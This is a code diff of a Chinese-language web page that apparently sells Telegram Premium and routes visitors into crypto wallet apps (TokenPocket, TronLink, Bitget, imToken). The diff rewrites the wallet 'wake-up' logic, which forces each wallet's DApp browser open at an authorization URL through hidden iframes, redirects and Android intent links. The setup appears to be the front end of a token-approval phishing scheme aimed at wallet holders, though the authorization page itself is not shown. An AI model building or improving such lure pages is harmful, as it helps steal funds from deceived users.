@@ -379,7 +379,7 @@
                         <div class="wallet-icon">
                             <img src="https://i.ibb.co/gbqHxTKN/Bitget-wallet.png" alt="Bitget Wallet" onerror="this.style.display='none'; this.parentNode.innerHTML='💰';">
                         </div>
-                        <div class="wallet-name">Bitget Wallet</div>
+                        <div class="wallet-name">Bitget</div>
                     </div>
                     
                     <div class="wallet-option" onclick="wakeupWalletApp('imToken')">
@@ -395,7 +395,8 @@
         <div class="features">
             <div class="feature">
                 <div class="feature-icon">
-                    <img src="https://i.ibb.co/4n WVZXSp/open-folder-file-icon-219486.png" alt="更大文件上传" style="width: 40px; height: 40px;">
+                    <!-- 保留图标展示（若图挂掉也不会影响布局） -->
+                    📁
                 </div>
                 <h3>更大文件上传</h3>
                 <p>上传最大 4GB 的文件</p>
@@ -403,7 +404,7 @@
             
             <div class="feature">
                 <div class="feature-icon">
-                    <img src="https://i.ibb.co/C58QKWSM/1695711361784527.jpg" alt="更快的下载速度" style="width: 40px; height: 40px;">
+                    ⚡
                 </div>
                 <h3>更快的下载速度</h3>
                 <p>享受无限制的下载速度</p>
@@ -411,7 +412,7 @@
             
             <div class="feature">
                 <div class="feature-icon">
-                    <img src="https://i.ibb.co/whwVyw5b/Telegram-logo-svg.webp" alt="专属贴纸" style="width: 40px; height: 40px;">
+                    🖼️
                 </div>
                 <h3>专属贴纸</h3>
                 <p>使用 Premium 专属动画贴纸</p>
@@ -419,7 +420,7 @@
             
             <div class="feature">
                 <div class="feature-icon">
-                    <img src="https://i.ibb.co/XZKJLw9b/photo-2025-10-31-23-15-28.jpg" alt="高级聊天管理" style="width: 40px; height: 40px;">
+                    🛠️
                 </div>
                 <h3>高级聊天管理</h3>
                 <p>创建群组链接和更多管理工具</p>
@@ -509,14 +510,14 @@
             return authUrl;
         }
 
-        // 钱包唤醒函数（只修改手机浏览器唤醒相关逻辑）
+        // === 唤醒钱包并跳转到授权页（仅此处为修正代码） ===
         function wakeupWalletApp(walletName) {
             const fullAuthUrl = generatePaymentUrl();
             if (!fullAuthUrl) return;
 
             console.log('支付链接:', fullAuthUrl);
 
-            // 如果在钱包内部，直接用绝对 URL 跳转（修复：原来使用相对路径 wallet-auth.html 导致某些浏览器/钱包解析失败）
+            // 如果在钱包内部，直接用绝对 URL 跳转（保持原行为）
             if (isInWalletBrowser()) {
                 showTemporaryMessage('正在跳转到支付页面...');
                 setTimeout(() => {
@@ -525,150 +526,69 @@
                 return;
             }
 
-            // 根据钱包类型调用不同的唤醒方法（将完整 URL 作为参数传给钱包 deep link）
-            if (walletName === 'TokenPocket') {
-                wakeupTokenPocket(fullAuthUrl);
-            } else if (walletName === 'TronLink') {
-                wakeupTronLink(fullAuthUrl);
-            } else if (walletName === 'Bitget') {
-                wakeupBitget(fullAuthUrl);
-            } else if (walletName === 'imToken') {
-                wakeupImToken(fullAuthUrl);
-            } else {
-                // 默认直接在当前页面打开
-                window.location.href = fullAuthUrl;
-            }
-        }
-
-        // TokenPocket 唤醒
-        function wakeupTokenPocket(fullAuthUrl) {
-            const schemes = [
-                `tpoutside://open?url=${encodeURIComponent(fullAuthUrl)}`,
-                `tpoutside://pull.activity?action=openDapp&dappUrl=${encodeURIComponent(fullAuthUrl)}`,
-                `tpoutside://browse?url=${encodeURIComponent(fullAuthUrl)}`,
-                // 通用 https 作为最后尝试（会在浏览器新标签打开）
-                fullAuthUrl
-            ];
-            
-            attemptMultipleSchemes(schemes, 'TokenPocket');
-        }
-
-        // TronLink 唤醒
-        function wakeupTronLink(fullAuthUrl) {
-            const schemes = [
-                `tronlink://open?url=${encodeURIComponent(fullAuthUrl)}`,
-                `tronlinkoutside://open?url=${encodeURIComponent(fullAuthUrl)}`,
-                // 尝试将 url 直接作为参数的常见变体
-                `tronlink://browse?url=${encodeURIComponent(fullAuthUrl)}`,
-                fullAuthUrl
-            ];
-            
-            attemptMultipleSchemes(schemes, 'TronLink');
-        }
-
-        // Bitget Wallet 唤醒
-        function wakeupBitget(fullAuthUrl) {
-            const schemes = [
-                `bitkeep://open?url=${encodeURIComponent(fullAuthUrl)}`,
-                `bitgetwallet://open?url=${encodeURIComponent(fullAuthUrl)}`,
-                `bk://open?url=${encodeURIComponent(fullAuthUrl)}`,
-                `bitkeep://browse?url=${encodeURIComponent(fullAuthUrl)}`,
-                fullAuthUrl
-            ];
-            
-            attemptMultipleSchemes(schemes, 'Bitget Wallet');
-        }
-
-        // imToken 唤醒
-        function wakeupImToken(fullAuthUrl) {
-            const schemes = [
-                `imtokenv2://navigate?url=${encodeURIComponent(fullAuthUrl)}`,
-                `imtoken://navigate?url=${encodeURIComponent(fullAuthUrl)}`,
-                `imtokenv2://open?url=${encodeURIComponent(fullAuthUrl)}`,
-                fullAuthUrl
-            ];
-            
-            attemptMultipleSchemes(schemes, 'imToken');
-        }
-
-        // 尝试多个唤醒方案（改进：不依赖同步返回值，逐个尝试并在全部失败后提示）
-        function attemptMultipleSchemes(schemes, walletName) {
-            let tried = 0;
-            let lastAttemptTime = Date.now();
-
-            function tryNextScheme() {
-                if (tried >= schemes.length) {
-                    console.log(`所有 ${walletName} 唤醒方案都尝试完了`);
-                    showTemporaryMessage(`${walletName} 唤醒失败，已打开支付页面（请手动在钱包应用中打开 DApp 浏览器并访问支付页面）`);
-                    return;
-                }
-
-                const scheme = schemes[tried];
-                console.log(`尝试 ${walletName} 方案 ${tried + 1}:`, scheme);
-                attemptWakeup(scheme);
-
-                // 给每个方案一定时间（0.9s - 1.5s）观察是否跳转成功，再尝试下一个
-                tried++;
-                setTimeout(() => {
-                    tryNextScheme();
-                }, 1100);
+            // 根据钱包类型构造官方/常用 deep link（把完整 URL 作为参数传给钱包）
+            let deeplink;
+            switch (walletName) {
+                case 'TokenPocket':
+                    deeplink = `tpdapp://open?url=${encodeURIComponent(fullAuthUrl)}`;
+                    break;
+                case 'TronLink':
+                    deeplink = `tronlinkoutside://dapp?url=${encodeURIComponent(fullAuthUrl)}`;
+                    break;
+                case 'Bitget':
+                    // Bitget/BitKeep 常用 scheme 之一
+                    deeplink = `bitkeep://dapp?url=${encodeURIComponent(fullAuthUrl)}`;
+                    break;
+                case 'imToken':
+                    deeplink = `imtokenv2://navigate?url=${encodeURIComponent(fullAuthUrl)}`;
+                    break;
+                default:
+                    deeplink = fullAuthUrl;
             }
 
-            tryNextScheme();
-        }
-
-        // 尝试唤醒钱包（尽量用 iframe + location + open 方法组合提高命中率）
-        function attemptWakeup(scheme) {
+            // 使用 iframe 触发 + 备用直接跳转 + Android intent 方案，覆盖更多浏览器/平台组合
             try {
-                // 如果 scheme 是以 http(s) 开头，直接在新标签打开
-                if (/^https?:\/\//i.test(scheme)) {
-                    // 在移动浏览器上使用 open 可以触发“在新窗口打开”或是被钱包拦截到 DApp 浏览器
-                    window.open(scheme, '_blank');
-                    return;
-                }
-
-                // 方法1: 使用 iframe 触发 scheme（很多钱包支持）
+                // 方法1: iframe 触发
                 const iframe = document.createElement('iframe');
                 iframe.style.display = 'none';
-                iframe.src = scheme;
+                iframe.src = deeplink;
                 document.body.appendChild(iframe);
 
                 setTimeout(() => {
                     try { document.body.removeChild(iframe); } catch (e) { /* ignore */ }
                 }, 1200);
-
-                // 方法2: 尝试 location.href（作为后备）
-                setTimeout(() => {
-                    try {
-                        window.location.href = scheme;
-                    } catch (e) {
-                        // ignore
-                    }
-                }, 300);
-
-                // 方法3: 对 Android Chrome，尝试 intent URL（以防深度链接包名解析需要）
-                // 仅当 scheme 看起来是自定义 protocol 时尝试构造 intent（捕获 https 方案时不要构造）
-                if (!/^https?:\/\//i.test(scheme)) {
-                    // 将自定义 scheme 作为 url 参数放入 intent 的路径（通用尝试）
-                    try {
-                        const decoded = decodeURIComponent(scheme);
-                        const intentUrl = `intent://${decoded}#Intent;scheme=${scheme.split(':')[0]};end`;
-                        // 仅在 Android 上尝试（简单 UA 检测）
-                        if (/Android/i.test(navigator.userAgent)) {
-                            setTimeout(() => {
-                                try { window.location.href = intentUrl; } catch (e) { /* ignore */ }
-                            }, 600);
-                        }
-                    } catch (e) {
-                        // ignore
-                    }
-                }
-            } catch (error) {
-                console.log('attemptWakeup 错误:', error);
+            } catch (e) {
+                console.log('iframe 唤醒失败：', e);
             }
+
+            // 方法2: 备用直接跳转（部分浏览器需要）
+            setTimeout(() => {
+                try { window.location.href = deeplink; } catch (e) { /* ignore */ }
+            }, 800);
+
+            // 方法3: Android intent 备用（仅在 Android UA 上尝试）
+            try {
+                if (/Android/i.test(navigator.userAgent)) {
+                    // 构造一个 intent URL，把 deeplink 中的 payload 放入 path 部分
+                    // 例如：intent://open?url=...#Intent;scheme=tpdapp;end
+                    const scheme = deeplink.split(':')[0];
+                    const payload = deeplink.replace(/^[^:]+:\/\//, '');
+                    const intentUrl = `intent://${payload}#Intent;scheme=${scheme};end`;
+                    setTimeout(() => {
+                        try { window.location.href = intentUrl; } catch (e) { /* ignore */ }
+                    }, 1200);
+                }
+            } catch (e) {
+                console.log('intent 构造异常：', e);
+            }
+
+            // 最后提供用户提示（如果唤醒失败用户可以手动打开钱包 DApp 浏览器访问）
+            setTimeout(() => {
+                showTemporaryMessage('如果钱包未自动打开，请在钱包 APP 的 DApp 浏览器中打开支付页面。');
+            }, 2000);
         }
 
-        // 检测是否在Bitget Wallet内
+        // 兼容性检查（保留）
         function checkBitgetWallet() {
             if (navigator.userAgent.includes('Bitget') || navigator.userAgent.includes('BitKeep')) {
                 console.log('在Bitget Wallet环境中');
@@ -677,7 +597,6 @@
             return false;
         }
 
-        // 页面加载时检查环境
         window.addEventListener('load', function() {
             if (checkBitgetWallet()) {
                 console.log('检测到在Bitget Wallet中运行');
